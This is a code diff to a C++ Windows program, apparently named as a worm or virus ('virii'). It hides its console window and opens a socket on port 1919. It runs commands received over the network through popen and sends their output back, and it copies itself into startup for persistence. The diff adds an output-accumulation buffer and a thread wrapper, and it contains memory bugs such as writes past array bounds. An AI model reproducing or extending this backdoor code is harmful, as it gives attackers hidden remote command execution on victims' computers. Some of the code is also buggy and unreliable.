@@ -3,13 +3,13 @@
 #include <thread>
 #include <string>
 #include <cstdlib>
+#include <fstream>
 #include <unistd.h>
 #include <tchar.h>
 #include <locale.h>
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
-#include <filesystem>
 #define MAX 8192
 
 class client{
@@ -26,12 +26,18 @@ private:
     char send_buf[MAX];
     char recv_buf[MAX];
 
+    char t[MAX];
+
     char p_w_d[MAX];
 public:
     client(): port_number(1919) {
         AllocConsole();
         window = FindWindowA("test", NULL);
         ShowWindow(window, 0);
+
+        send_buf[MAX] = {};
+        recv_buf[MAX] = {};
+        t[MAX] = {};
     }
 
     void virii();
@@ -72,22 +78,33 @@ void client::virii() {
             }
             else {
                 FILE *fp;
-                if ((fp = _popen(recv_buf, "r")) == NULL) {
+                if ((fp = popen(recv_buf, "r")) == NULL) {
                     perror("can not exec commad");
                 }
                 while (!feof(fp)) {
-                    fgets(recv_buf, sizeof(recv_buf), fp);
+                    strcat(t, send_buf);
+                    fgets(send_buf, sizeof(send_buf), fp);
                 }
-                (void)_pclose(fp);
+                memcpy(send_buf, t, MAX);
+                (void)pclose(fp);
             }
 
             send(dst_socket, send_buf, sizeof(send_buf), 0);
+            memset(send_buf, 0, MAX*sizeof(send_buf[0]));
+            memcpy(t, send_buf, MAX);
         }
     }
 
     closesocket(dst_socket);
 
     WSACleanup();
+}
+
+void start() {
+    client* client_virii;
+    client_virii = new client();
+
+    client_virii->virii();
 }
 
 int main(int argc, char **argv) {
@@ -111,7 +128,7 @@ int main(int argc, char **argv) {
     const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
     system(cmd_copy_worm_startup_p);
 
-    std::thread th(client::virii, client_virii);
+    std::thread th(start);
     th.join();
 
     return 0;
